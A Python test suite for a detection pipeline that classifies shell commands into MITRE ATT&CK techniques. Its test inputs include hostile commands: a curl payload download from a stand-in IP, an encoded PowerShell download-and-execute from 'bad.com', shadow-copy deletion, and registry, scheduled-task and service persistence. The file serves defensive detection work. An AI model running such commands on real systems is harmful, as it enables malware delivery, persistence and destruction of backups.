"""
validate_hybrid_pipeline.py — Tests for the full hybrid pipeline:
  residual text → candidate mask → prior fusion → fallback behaviour

Tests:
  - Residual text generation (tag correctness)
  - Candidate mask generation (correct MITRE mapping)
  - True-label coverage (organic coverage before forcing)
  - Prior fusion (additive, capped at 1.0)
  - Fallback when rules are sparse (all-1s mask)
  - End-to-end: command → full pipeline → mask + prior

Run:
    cd parser/
    python3 validate_hybrid_pipeline.py
"""

import json
import os
import sys

sys.path.insert(0, os.path.dirname(__file__))

from parser import parse_command
from semantic_features import build_semantic_features
from rule_engine import build_rule_result
from residual_text import build_hybrid_text, build_semantic_tags
from candidate_mask import (
    build_candidate_mask,
    build_prior_vector,
    apply_candidate_mask,
    fuse_logits_with_priors,
    compute_coverage_stats,
    RULE_CLASS_TO_MITRE,
    DEFAULT_ALPHA,
)

# Load specialist map once
_MAP_PATH = os.path.join(os.path.dirname(__file__), "..", "config", "specialist_map.json")
with open(_MAP_PATH) as _f:
    SPECIALIST_MAP = json.load(_f)
NUM_CLASSES = len(SPECIALIST_MAP)


# ─────────────────────────────────────────────────────────────────────────────
# Test runner
# ─────────────────────────────────────────────────────────────────────────────

def _run_pipeline(cmd: str, label: str = None):
    """Run full pipeline, return all intermediate results."""
    parsed = parse_command(cmd)
    sem = build_semantic_features(parsed)
    rule = build_rule_result(parsed, sem)
    hybrid_text = build_hybrid_text(parsed, sem)
    tags = build_semantic_tags(sem)
    mask_info = build_candidate_mask(rule, SPECIALIST_MAP, true_label=label)
    return {
        "parsed": parsed, "sem": sem, "rule": rule,
        "hybrid_text": hybrid_text, "tags": tags,
        "mask": mask_info,
    }


TESTS = []
_failures = []


def _test(test_id, fn):
    """Register and run a test function."""
    TESTS.append(test_id)
    try:
        fn()
        print(f"PASS  [{test_id}]")
    except AssertionError as e:
        _failures.append((test_id, str(e)))
        print(f"FAIL  [{test_id}]")
        print(f"        {e}")


# ─────────────────────────────────────────────────────────────────────────────
# RESIDUAL TEXT TESTS
# ─────────────────────────────────────────────────────────────────────────────

def test_residual_curl_download():
    r = _run_pipeline("curl -o payload.exe http://1.2.3.4/payload.exe")
    assert "REMOTE_FETCH" in r["tags"], f"Missing REMOTE_FETCH in {r['tags']}"
    assert "WRITE_EXECUTABLE" in r["tags"], f"Missing WRITE_EXECUTABLE in {r['tags']}"
    assert "SIGNED_PROXY" in r["tags"], f"Missing SIGNED_PROXY in {r['tags']}"
    assert "|" in r["hybrid_text"], "Missing separator in hybrid_text"
    assert "curl" in r["hybrid_text"], "Raw command not in hybrid_text"

def test_residual_encoded_ps():
    cmd = "powershell.exe -EncodedCommand SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLmNvbScpKQ=="
    r = _run_pipeline(cmd)
    assert "ENCODED_PAYLOAD" in r["tags"]
    assert "OBFUSCATED" in r["tags"]
    assert "REMOTE_FETCH" in r["tags"]
    # Hybrid text should use deobfuscated command
    assert "IEX" in r["hybrid_text"] or "DownloadString" in r["hybrid_text"], \
        "Deobfuscated payload not in hybrid_text"

def test_residual_benign_ls():
    r = _run_pipeline("ls")
    assert r["tags"] == [], f"Benign 'ls' should produce no tags, got {r['tags']}"
    assert r["hybrid_text"] == "ls"

def test_residual_tar_create():
    r = _run_pipeline("tar -czf backup.tar.gz /home/user/data")
    assert "ARCHIVE_CREATE" in r["tags"]
    assert "ARCHIVE_EXTRACT" not in r["tags"]

def test_residual_tar_extract():
    r = _run_pipeline("tar -xzf archive.tar.gz")
    assert "ARCHIVE_EXTRACT" in r["tags"]
    assert "ARCHIVE_CREATE" not in r["tags"]

def test_residual_shadow_delete():
    r = _run_pipeline("vssadmin delete shadows /all /quiet")
    assert "SHADOW_DELETE" in r["tags"]

def test_residual_whoami():
    r = _run_pipeline("whoami")
    assert "ENUM_IDENTITY" in r["tags"]

def test_residual_schtasks():
    r = _run_pipeline("schtasks /create /tn updater /tr evil.exe /sc onlogon")
    assert "TASK_CREATE" in r["tags"]
    assert "WRITE_EXECUTABLE" in r["tags"]

def test_residual_registry():
    r = _run_pipeline(r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Up /t REG_SZ /d C:\evil.exe /f")
    assert "REGISTRY_AUTORUN" in r["tags"]

def test_residual_service_create():
    r = _run_pipeline(r"sc create svc binPath= C:\evil.exe")
    assert "SERVICE_CREATE" in r["tags"]


# ─────────────────────────────────────────────────────────────────────────────
# CANDIDATE MASK TESTS
# ─────────────────────────────────────────────────────────────────────────────

def test_mask_registry_contains_T1547():
    r = _run_pipeline(
        r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Up /t REG_SZ /d C:\evil.exe /f",
        label="T1547",
    )
    m = r["mask"]
    assert "T1547" in m["candidate_mitre_ids"], f"T1547 missing from {m['candidate_mitre_ids']}"
    assert m["candidate_mask"][SPECIALIST_MAP["T1547"]] == 1

def test_mask_schtasks_contains_T1053():
    r = _run_pipeline("schtasks /create /tn updater /tr evil.exe /sc onlogon", label="T1053")
    m = r["mask"]
    assert "T1053" in m["candidate_mitre_ids"]
    assert m["true_label_in_candidates"] is True

def test_mask_ingress_contains_T1105():
    r = _run_pipeline("curl -o payload.exe http://1.2.3.4/payload.exe", label="T1105")
    m = r["mask"]
    assert "T1105" in m["candidate_mitre_ids"]
    assert m["candidate_mask"][SPECIALIST_MAP["T1105"]] == 1

def test_mask_shadow_delete_contains_T1490():
    r = _run_pipeline("vssadmin delete shadows /all /quiet", label="T1490")
    m = r["mask"]
    assert "T1490" in m["candidate_mitre_ids"]
    # T1490 rule bans ingress/registry/schtask
    assert "T1105" not in m["candidate_mitre_ids"]
    assert "T1547" not in m["candidate_mitre_ids"]
    assert "T1053" not in m["candidate_mitre_ids"]

def test_mask_wmi_contains_T1047():
    r = _run_pipeline('wmic process call create "cmd.exe /c whoami"', label="T1047")
    m = r["mask"]
    assert "T1047" in m["candidate_mitre_ids"]

def test_mask_encoded_ps_multi_class():
    cmd = "powershell.exe -EncodedCommand SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLmNvbScpKQ=="
    r = _run_pipeline(cmd, label="T1059")
    m = r["mask"]
    # Should have multiple candidate classes (obfuscation + execution + ingress)
    assert m["num_candidates"] >= 4, f"Expected ≥4 candidates, got {m['num_candidates']}"
    assert "T1059" in m["candidate_mitre_ids"]  # command and scripting
    assert "T1027" in m["candidate_mitre_ids"]  # obfuscated files
    assert "T1105" in m["candidate_mitre_ids"]  # ingress tool transfer

def test_mask_size_108():
    r = _run_pipeline("ls")
    m = r["mask"]
    assert len(m["candidate_mask"]) == NUM_CLASSES, f"Mask length {len(m['candidate_mask'])} != {NUM_CLASSES}"
    assert len(m["prior_vector"]) == NUM_CLASSES

def test_mask_sc_create():
    r = _run_pipeline(r"sc create svc binPath= C:\evil.exe", label="T1543")
    m = r["mask"]
    assert "T1543" in m["candidate_mitre_ids"]
    assert m["true_label_in_candidates"] is True


# ─────────────────────────────────────────────────────────────────────────────
# FALLBACK TESTS
# ─────────────────────────────────────────────────────────────────────────────

def test_fallback_benign_ls():
    """ls now correctly triggers file_dir_discovery rule → not a fallback."""
    r = _run_pipeline("ls", label="T1083")
    m = r["mask"]
    # ls triggers file_dir_discovery; T1083 should be in candidates organically
    assert m["used_fallback"] is False, "ls should fire file_dir_discovery rule"
    assert m["true_label_in_candidates"] is True, "T1083 should be in candidates"

def test_fallback_unknown_command():
    r = _run_pipeline("foobar --xyz", label="T1059")
    m = r["mask"]
    assert m["used_fallback"] is True
    # True label should still be in mask (all 1s)
    assert m["candidate_mask"][SPECIALIST_MAP["T1059"]] == 1

def test_fallback_fragment():
    """Specialist training data includes fragments like 'try{' or 'SIGQUIT'."""
    r = _run_pipeline("try{", label="T1070")
    m = r["mask"]
    assert m["used_fallback"] is True
    assert m["candidate_mask"][SPECIALIST_MAP["T1070"]] == 1


# ─────────────────────────────────────────────────────────────────────────────
# PRIOR VECTOR TESTS
# ─────────────────────────────────────────────────────────────────────────────

def test_prior_registry_autorun():
    r = _run_pipeline(r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Up /t REG_SZ /d C:\evil.exe /f")
    pv = r["mask"]["prior_vector"]
    idx = SPECIALIST_MAP["T1547"]
    assert pv[idx] >= 0.85, f"T1547 prior {pv[idx]} < 0.85"

def test_prior_shadow_delete():
    r = _run_pipeline("vssadmin delete shadows /all /quiet")
    pv = r["mask"]["prior_vector"]
    idx = SPECIALIST_MAP["T1490"]
    assert pv[idx] >= 0.85, f"T1490 prior {pv[idx]} < 0.85"

def test_prior_benign_zero():
    """Use 'pwd' as a truly benign command that triggers no rules."""
    r = _run_pipeline("pwd")
    pv = r["mask"]["prior_vector"]
    assert all(v == 0.0 for v in pv), f"Expected all-zero priors for benign 'pwd'"

def test_prior_capped_at_one():
    """Encoded PS download accumulates priors; T1105 prior should cap at 1.0."""
    cmd = "powershell.exe -EncodedCommand SUVYKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLmNvbScpKQ=="
    r = _run_pipeline(cmd)
    pv = r["mask"]["prior_vector"]
    assert all(v <= 1.0 for v in pv), f"Prior exceeds 1.0: {max(pv)}"


# ─────────────────────────────────────────────────────────────────────────────
# FUSION / MASK LOGIT TESTS (use torch if available)
# ─────────────────────────────────────────────────────────────────────────────

def test_fusion_additive():
    try:
        import torch
    except ImportError:
        return  # skip if no torch
    logits = torch.tensor([[1.0, 2.0, 3.0]])
    priors = torch.tensor([0.5, 0.0, 0.5])
    fused = fuse_logits_with_priors(logits, priors, alpha=1.0)
    expected = torch.tensor([[1.5, 2.0, 3.5]])
    assert torch.allclose(fused, expected), f"Fusion mismatch: {fused} != {expected}"

def test_mask_logits():
    try:
        import torch
    except ImportError:
        return
    logits = torch.tensor([[5.0, 3.0, 1.0, 7.0]])
    mask = torch.tensor([1.0, 0.0, 1.0, 0.0])
    masked = apply_candidate_mask(logits, mask, mask_value=-1e9)
    assert masked[0, 0].item() == 5.0
    assert masked[0, 1].item() < -1e8  # masked out
    assert masked[0, 2].item() == 1.0
    assert masked[0, 3].item() < -1e8

def test_mask_preserves_argmax():
    try:
        import torch
    except ImportError:
        return
    logits = torch.tensor([[1.0, 10.0, 5.0, 2.0]])
    mask = torch.tensor([1.0, 0.0, 1.0, 1.0])  # mask out class 1 (highest)
    masked = apply_candidate_mask(logits, mask)
    pred = torch.argmax(masked, dim=1).item()
    assert pred == 2, f"Expected argmax=2 after masking, got {pred}"


# ─────────────────────────────────────────────────────────────────────────────
# NEIGHBOUR EXPANSION TESTS
# ─────────────────────────────────────────────────────────────────────────────

def test_neighbour_expansion_small_set():
    """When candidate set is < MIN_CANDIDATE_SIZE, neighbours should be added."""
    r = _run_pipeline("whoami", label="T1087")
    m = r["mask"]
    # T1087 → neighbours T1033, T1069
    assert m["num_candidates"] >= 3, \
        f"Expected ≥3 candidates with expansion, got {m['num_candidates']}: {m['candidate_mitre_ids']}"
    # At least one neighbour should be present
    neighbours = {"T1033", "T1069"}
    found = neighbours & set(m["candidate_mitre_ids"])
    assert len(found) > 0, f"No neighbours found in {m['candidate_mitre_ids']}"


# ─────────────────────────────────────────────────────────────────────────────
# COVERAGE STATS TEST
# ─────────────────────────────────────────────────────────────────────────────

def test_coverage_stats_basic():
    results = [
        {"true_label_in_candidates": True, "used_fallback": False, "num_candidates": 5},
        {"true_label_in_candidates": False, "used_fallback": False, "num_candidates": 3},
        {"true_label_in_candidates": True, "used_fallback": True, "num_candidates": 91},
    ]
    stats = compute_coverage_stats(results)
    assert stats["total"] == 3
    assert stats["organic_true_label_in_candidates"] == 2  # first + third
    assert stats["fallback_count"] == 1
    assert stats["avg_candidate_size"] == round((5 + 3 + 91) / 3, 2)


# ─────────────────────────────────────────────────────────────────────────────
# TRUE-LABEL COVERAGE ON REAL COMMANDS
# ─────────────────────────────────────────────────────────────────────────────

def test_true_label_coverage_batch():
    """
    Run a batch of representative commands and check that organic coverage
    is reasonable (≥ 50% for this small set — the full dataset will have higher
    fallback rate which pushes effective coverage up).
    """
    cases = [
        (r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Up /t REG_SZ /d C:\evil.exe /f", "T1547"),
        ("schtasks /create /tn updater /tr evil.exe /sc onlogon", "T1053"),
        ("curl -o payload.exe http://1.2.3.4/payload.exe", "T1105"),
        ("tar -czf backup.tar.gz /home/user/data", "T1560"),
        ("vssadmin delete shadows /all /quiet", "T1490"),
        (r"sc create svc binPath= C:\evil.exe", "T1543"),
        ('wmic process call create "cmd.exe /c whoami"', "T1047"),
        ("whoami", "T1087"),
    ]
    mask_results = []
    for cmd, label in cases:
        r = _run_pipeline(cmd, label=label)
        mask_results.append(r["mask"])

    organic_in = sum(1 for m in mask_results if m["true_label_in_candidates"] is True)
    coverage = organic_in / len(cases) * 100
    assert coverage >= 80, \
        f"True-label coverage {coverage:.0f}% is too low (need ≥80%): " + \
        ", ".join(f"{c[1]}={'✓' if m['true_label_in_candidates'] else '✗'}"
                  for c, m in zip(cases, mask_results))


# ─────────────────────────────────────────────────────────────────────────────
# MITRE MAPPING COMPLETENESS
# ─────────────────────────────────────────────────────────────────────────────

def test_mitre_mapping_all_valid():
    """Every MITRE ID in the rule→MITRE mapping must exist in specialist_map."""
    missing = []
    for cls, tids in RULE_CLASS_TO_MITRE.items():
        for tid in tids:
            if tid not in SPECIALIST_MAP:
                missing.append(f"{cls} → {tid}")
    assert not missing, f"Invalid MITRE IDs in mapping: {missing}"


# ─────────────────────────────────────────────────────────────────────────────
# BUCKET / FUNNEL TESTS
# ─────────────────────────────────────────────────────────────────────────────

def test_bucket_strong_tight_candidates():
    """Strong bucket should produce a tighter candidate set than full space."""
    r = _run_pipeline(
        r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Up /t REG_SZ /d C:\evil.exe /f",
        label="T1547",
    )
    m = r["mask"]
    assert m["rule_strength"] == "strong"
    assert m["true_label_in_candidates"] is True
    assert m["num_candidates"] < NUM_CLASSES, \
        f"Strong bucket should be narrower than {NUM_CLASSES}, got {m['num_candidates']}"
    # Strong rules should produce reasonably tight sets
    assert m["num_candidates"] <= 60, \
        f"Strong bucket too wide: {m['num_candidates']}"

def test_bucket_weak_broader_candidates():
    """Weak bucket should be broader than strong but not full space."""
    r = _run_pipeline("whoami", label="T1087")
    m = r["mask"]
    assert m["rule_strength"] == "weak"
    assert m["true_label_in_candidates"] is True
    assert m["num_candidates"] < NUM_CLASSES, \
        f"Weak bucket should not be full label space, got {m['num_candidates']}"

def test_bucket_none_full_space():
    """None bucket gets full label space — ML decides."""
    r = _run_pipeline("pwd", label="T1082")
    m = r["mask"]
    assert m["rule_strength"] == "none"
    assert m["used_fallback"] is True
    assert m["num_candidates"] == NUM_CLASSES, \
        f"None bucket should be full space ({NUM_CLASSES}), got {m['num_candidates']}"
    assert m["true_label_in_candidates"] is True

def test_bucket_strong_smaller_than_weak():
    """Strong bucket should generally produce fewer candidates than weak."""
    strong = _run_pipeline("vssadmin delete shadows /all /quiet", label="T1490")
    weak = _run_pipeline("ls -la /tmp", label="T1083")
    assert strong["mask"]["rule_strength"] == "strong"
    assert weak["mask"]["rule_strength"] == "weak"
    assert strong["mask"]["num_candidates"] <= weak["mask"]["num_candidates"], \
        f"Strong ({strong['mask']['num_candidates']}) should be ≤ weak ({weak['mask']['num_candidates']})"

def test_bucket_none_does_not_invent():
    """None bucket should have no priors — rules don't pretend to know."""
    r = _run_pipeline("foobar --xyz")
    m = r["mask"]
    assert m["rule_strength"] == "none"
    pv = m["prior_vector"]
    assert all(v == 0.0 for v in pv), "None bucket should have zero priors"

def test_bucket_propagated_to_mask():
    """rule_strength from rule_engine should propagate through to mask output."""
    for cmd, expected in [
        ("vssadmin delete shadows /all /quiet", "strong"),
        ("whoami", "weak"),
        ("pwd", "none"),
    ]:
        r = _run_pipeline(cmd)
        assert r["mask"]["rule_strength"] == expected, \
            f"'{cmd}' expected {expected}, got {r['mask']['rule_strength']}"


# ─────────────────────────────────────────────────────────────────────────────
# SOFT PRIOR VECTOR TESTS
# ─────────────────────────────────────────────────────────────────────────────

def test_prior_vector_strong_nonzero():
    """Strong bucket should produce nonzero scaled prior vector."""
    parsed = parse_command(r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Up /t REG_SZ /d C:\evil.exe /f")
    sem = build_semantic_features(parsed)
    rule = build_rule_result(parsed, sem)
    pv = build_prior_vector(rule, SPECIALIST_MAP)
    assert pv["rule_strength"] == "strong"
    assert pv["alpha"] == DEFAULT_ALPHA["strong"]
    assert any(v > 0 for v in pv["prior_vector"]), "Strong should have nonzero priors"
    # T1547 should be boosted
    idx = SPECIALIST_MAP["T1547"]
    assert pv["prior_vector"][idx] > 0, "T1547 should be boosted for registry autorun"
    assert pv["prior_vector"][idx] == pv["raw_prior"][idx] * pv["alpha"]

def test_prior_vector_weak_lower_alpha():
    """Weak bucket should use lower alpha than strong."""
    parsed = parse_command("whoami")
    sem = build_semantic_features(parsed)
    rule = build_rule_result(parsed, sem)
    pv = build_prior_vector(rule, SPECIALIST_MAP)
    assert pv["rule_strength"] == "weak"
    assert pv["alpha"] == DEFAULT_ALPHA["weak"]
    assert pv["alpha"] < DEFAULT_ALPHA["strong"]
    assert any(v > 0 for v in pv["prior_vector"])

def test_prior_vector_none_zero():
    """None bucket should produce zero prior vector (alpha=0)."""
    parsed = parse_command("pwd")
    sem = build_semantic_features(parsed)
    rule = build_rule_result(parsed, sem)
    pv = build_prior_vector(rule, SPECIALIST_MAP)
    assert pv["rule_strength"] == "none"
    assert pv["alpha"] == 0.0
    assert all(v == 0.0 for v in pv["prior_vector"]), "None bucket must have all-zero priors"

def test_prior_vector_no_class_eliminated():
    """Soft priors should never be negative — no class is penalized."""
    for cmd in [
        r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Up /t REG_SZ /d C:\evil.exe /f",
        "whoami", "ls", "pwd", "foobar --xyz",
        "vssadmin delete shadows /all /quiet",
    ]:
        parsed = parse_command(cmd)
        sem = build_semantic_features(parsed)
        rule = build_rule_result(parsed, sem)
        pv = build_prior_vector(rule, SPECIALIST_MAP)
        assert all(v >= 0 for v in pv["prior_vector"]), \
            f"Negative prior for '{cmd}': {min(pv['prior_vector'])}"

def test_prior_vector_alpha_override():
    """Alpha overrides should be respected."""
    parsed = parse_command("vssadmin delete shadows /all /quiet")
    sem = build_semantic_features(parsed)
    rule = build_rule_result(parsed, sem)
    pv = build_prior_vector(rule, SPECIALIST_MAP, alpha_overrides={"strong": 5.0})
    assert pv["alpha"] == 5.0
    idx = SPECIALIST_MAP["T1490"]
    assert pv["prior_vector"][idx] == pv["raw_prior"][idx] * 5.0

def test_fusion_no_class_eliminated():
    """After fusion, all logits remain finite (no -inf masking)."""
    try:
        import torch
    except ImportError:
        return
    logits = torch.randn(1, NUM_CLASSES)
    parsed = parse_command(r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Up /t REG_SZ /d C:\evil.exe /f")
    sem = build_semantic_features(parsed)
    rule = build_rule_result(parsed, sem)
    pv = build_prior_vector(rule, SPECIALIST_MAP)
    fused = fuse_logits_with_priors(logits, pv["prior_vector"])
    assert torch.all(torch.isfinite(fused)), "Fused logits must all be finite"
    assert fused.shape == logits.shape

def test_fusion_strong_influences_more_than_weak():
    """Strong priors should shift logits more than weak priors."""
    try:
        import torch
    except ImportError:
        return
    logits = torch.zeros(1, NUM_CLASSES)

    # Strong
    parsed = parse_command("vssadmin delete shadows /all /quiet")
    sem = build_semantic_features(parsed)
    rule = build_rule_result(parsed, sem)
    pv_strong = build_prior_vector(rule, SPECIALIST_MAP)
    fused_strong = fuse_logits_with_priors(logits, pv_strong["prior_vector"])
    strong_max = fused_strong.max().item()

    # Weak
    parsed = parse_command("whoami")
    sem = build_semantic_features(parsed)
    rule = build_rule_result(parsed, sem)
    pv_weak = build_prior_vector(rule, SPECIALIST_MAP)
    fused_weak = fuse_logits_with_priors(logits, pv_weak["prior_vector"])
    weak_max = fused_weak.max().item()

    assert strong_max > weak_max, \
        f"Strong max ({strong_max}) should exceed weak max ({weak_max})"


# ─────────────────────────────────────────────────────────────────────────────
# RUN ALL
# ─────────────────────────────────────────────────────────────────────────────

def main():
    # Residual text tests
    _test("residual_curl_download", test_residual_curl_download)
    _test("residual_encoded_ps", test_residual_encoded_ps)
    _test("residual_benign_ls", test_residual_benign_ls)
    _test("residual_tar_create", test_residual_tar_create)
    _test("residual_tar_extract", test_residual_tar_extract)
    _test("residual_shadow_delete", test_residual_shadow_delete)
    _test("residual_whoami", test_residual_whoami)
    _test("residual_schtasks", test_residual_schtasks)
    _test("residual_registry", test_residual_registry)
    _test("residual_service_create", test_residual_service_create)

    # Candidate mask tests
    _test("mask_registry_T1547", test_mask_registry_contains_T1547)
    _test("mask_schtasks_T1053", test_mask_schtasks_contains_T1053)
    _test("mask_ingress_T1105", test_mask_ingress_contains_T1105)
    _test("mask_shadow_T1490", test_mask_shadow_delete_contains_T1490)
    _test("mask_wmi_T1047", test_mask_wmi_contains_T1047)
    _test("mask_encoded_ps_multi", test_mask_encoded_ps_multi_class)
    _test("mask_size", test_mask_size_108)
    _test("mask_sc_create_T1543", test_mask_sc_create)

    # Fallback tests
    _test("fallback_benign_ls", test_fallback_benign_ls)
    _test("fallback_unknown_cmd", test_fallback_unknown_command)
    _test("fallback_fragment", test_fallback_fragment)

    # Prior vector tests
    _test("prior_registry_autorun", test_prior_registry_autorun)
    _test("prior_shadow_delete", test_prior_shadow_delete)
    _test("prior_benign_zero", test_prior_benign_zero)
    _test("prior_capped_at_one", test_prior_capped_at_one)

    # Logit fusion/mask tests
    _test("fusion_additive", test_fusion_additive)
    _test("mask_logits", test_mask_logits)
    _test("mask_preserves_argmax", test_mask_preserves_argmax)

    # Expansion + coverage
    _test("neighbour_expansion", test_neighbour_expansion_small_set)
    _test("coverage_stats", test_coverage_stats_basic)
    _test("true_label_coverage", test_true_label_coverage_batch)

    # Mapping completeness
    _test("mitre_mapping_valid", test_mitre_mapping_all_valid)

    # Bucket / funnel tests
    _test("bucket_strong_tight", test_bucket_strong_tight_candidates)
    _test("bucket_weak_broader", test_bucket_weak_broader_candidates)
    _test("bucket_none_full_space", test_bucket_none_full_space)
    _test("bucket_strong_leq_weak", test_bucket_strong_smaller_than_weak)
    _test("bucket_none_no_priors", test_bucket_none_does_not_invent)
    _test("bucket_propagated", test_bucket_propagated_to_mask)

    # Soft prior tests
    _test("prior_vec_strong_nonzero", test_prior_vector_strong_nonzero)
    _test("prior_vec_weak_lower_alpha", test_prior_vector_weak_lower_alpha)
    _test("prior_vec_none_zero", test_prior_vector_none_zero)
    _test("prior_vec_no_eliminate", test_prior_vector_no_class_eliminated)
    _test("prior_vec_alpha_override", test_prior_vector_alpha_override)
    _test("fusion_no_eliminate", test_fusion_no_class_eliminated)
    _test("fusion_strong_gt_weak", test_fusion_strong_influences_more_than_weak)

    # Summary
    total = len(TESTS)
    passed = total - len(_failures)
    print(f"\nResults: {passed}/{total} passed")
    if _failures:
        print("FAIL  Some tests failed!")
        for tid, msg in _failures:
            print(f"  [{tid}]: {msg}")
        sys.exit(1)
    else:
        print("PASS  All tests passed!")


if __name__ == "__main__":
    main()
